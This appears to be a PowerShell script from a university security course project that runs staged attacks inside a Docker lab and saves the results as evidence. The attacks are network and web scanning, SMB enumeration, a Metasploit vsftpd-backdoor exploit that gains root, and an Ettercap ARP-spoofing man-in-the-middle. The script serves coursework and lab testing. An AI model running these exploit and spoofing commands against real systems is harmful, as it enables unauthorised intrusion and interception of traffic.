# ==============================================================================
# PROYECTO FINAL SEGURIDAD INFORMATICA - CLINICA LIMATAMBO (UPN)
# Ejecucion Automatica de TODAS las Pruebas Reales en Docker (Semanas 3 a 12)
# ==============================================================================

$ErrorActionPreference = "Continue"
$DockerExe = "C:\Program Files\Docker\Docker\resources\bin\docker.exe"
if (-not (Test-Path $DockerExe)) { $DockerExe = "docker" }

$OutDir = "c:\Users\alons\OneDrive\Escritorio\Seguridad Informatica\Proyecto_Final_Pivote\evidencias_reales"
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Write-Host "[1/8] Levantando servicios vulnerables en metasploitable-hce (10.0.0.20)..." -ForegroundColor Cyan
& $DockerExe exec metasploitable-hce bash -c "/bin/services.sh >/dev/null 2>&1 || true; service vsftpd start 2>/dev/null || /etc/init.d/vsftpd start 2>/dev/null || true; /etc/init.d/samba start 2>/dev/null || true; /etc/init.d/apache2 start 2>/dev/null || true; /etc/init.d/ssh start 2>/dev/null || true"
Start-Sleep -Seconds 3

Write-Host "[2/8] Ejecutando Semana 3: Reconocimiento de Red y Nmap (-sV -O)..." -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "ip -br a; echo '---'; arp-scan --interface=eth2 10.0.0.0/24 2>/dev/null || netdiscover -i eth2 -r 10.0.0.0/24 -P; echo '---'; nmap -sV -O 10.0.0.20" | Out-File -FilePath "$OutDir\EV_S3_Reconocimiento_Nmap.txt" -Encoding utf8

Write-Host "[3/8] Ejecutando Semana 4: Fingerprinting Web (WhatWeb y Nikto contra Portal DMZ 172.16.10.10)..." -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "whatweb -v http://172.16.10.10; echo '---'; nikto -h http://172.16.10.10 -maxtime 25s" | Out-File -FilePath "$OutDir\EV_S4_WhatWeb_Nikto_DMZ.txt" -Encoding utf8

Write-Host "[4/8] Ejecutando Semana 5: Escaneo SYN Stealth, Banner Grabbing (Netcat) y Enum4linux..." -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "nmap -sS -sV -T4 -p 21,22,80,139,445 10.0.0.20; echo '=== BANNER FTP 21 ==='; (echo QUIT | nc -v -w 3 10.0.0.20 21 2>&1); echo '=== BANNER SSH 22 ==='; (echo '' | nc -v -w 3 10.0.0.20 22 2>&1); echo '=== ENUM4LINUX SMB ==='; enum4linux -U -S 10.0.0.20 2>/dev/null | head -n 45" | Out-File -FilePath "$OutDir\EV_S5_Stealth_Netcat_Enum4linux.txt" -Encoding utf8

Write-Host "[5/8] Ejecutando Semana 7: Explotacion Metasploit (vsftpd_234_backdoor -> root en 10.0.0.20)..." -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "cat << 'EOF' > /tmp/msf_vsftpd.rc
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.20
set RPORT 21
exploit -z
sessions -C 'id; uname -a; hostname; pwd'
exit -y
EOF
msfconsole -q -r /tmp/msf_vsftpd.rc" | Out-File -FilePath "$OutDir\EV_S7_Metasploit_Root.txt" -Encoding utf8

Write-Host "[6/8] Ejecutando Semana 8: Demostracion MITM / ARP Spoofing (ip neigh + Ettercap + tcpdump)..." -ForegroundColor Cyan
& $DockerExe exec cliente-medico-lan bash -c "ping -c 1 10.0.0.20 >/dev/null 2>&1; ping -c 1 10.0.0.50 >/dev/null 2>&1; echo '=== ANTES DEL ATAQUE (cliente-medico-lan 10.0.0.10) ==='; ip neigh" | Out-File -FilePath "$OutDir\EV_S8_MITM_Ettercap.txt" -Encoding utf8
& $DockerExe exec kali-auditor bash -c "echo '=== ESCANEO ARP CAPA 2 ==='; arp-scan --interface=eth2 10.0.0.0/24 2>/dev/null; ettercap -T -q -i eth2 -M arp:remote /10.0.0.10// /10.0.0.20// >/tmp/ettercap.log 2>&1 & EPID=`$!; sleep 3; cat /tmp/ettercap.log | head -n 22; tcpdump -ni eth2 arp -c 4 2>&1; kill -9 `$EPID 2>/dev/null || true" | Out-File -FilePath "$OutDir\EV_S8_MITM_Ettercap.txt" -Append -Encoding utf8
& $DockerExe exec cliente-medico-lan bash -c "echo '=== ESTADO TABLA ARP EN ESTACION MEDICA ==='; ip neigh" | Out-File -FilePath "$OutDir\EV_S8_MITM_Ettercap.txt" -Append -Encoding utf8

Write-Host "[7/8] Ejecutando Semana 11: Verificacion Portal Web DMZ (172.16.10.10) y Reglas Firewall Perimetral..." -ForegroundColor Cyan
& $DockerExe exec cliente-medico-lan bash -c "echo '=== ACCESO DESDE LAN MEDICA (10.0.0.10) AL PORTAL WEB DMZ (172.16.10.10) ==='; curl -I http://172.16.10.10 2>/dev/null || true" | Out-File -FilePath "$OutDir\EV_S11_Perimetro_DMZ_Firewall.txt" -Encoding utf8
& $DockerExe exec fw-perimetral bash -c "echo '=== REGLAS DE FILTRADO PERIMETRAL (WAN / LAN / DMZ) ==='; iptables -L FORWARD -v -n" | Out-File -FilePath "$OutDir\EV_S11_Perimetro_DMZ_Firewall.txt" -Append -Encoding utf8

Write-Host "[8/8] Ejecutando Semana 12: Prueba de Intruso contra Sensor Honeypot en DMZ (172.16.10.20:2222)..." -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "nmap -sV -p 2222 172.16.10.20; nc -v -w 3 172.16.10.20 2222 </dev/null 2>&1 || true" | Out-File -FilePath "$OutDir\EV_S12_Honeypot_Logs.txt" -Encoding utf8
& $DockerExe logs --tail 25 honeypot-dmz 2>&1 | Out-File -FilePath "$OutDir\EV_S12_Honeypot_Logs.txt" -Append -Encoding utf8

Write-Host "`n[OK] Todas las evidencias reales fueron recolectadas en: $OutDir" -ForegroundColor Green
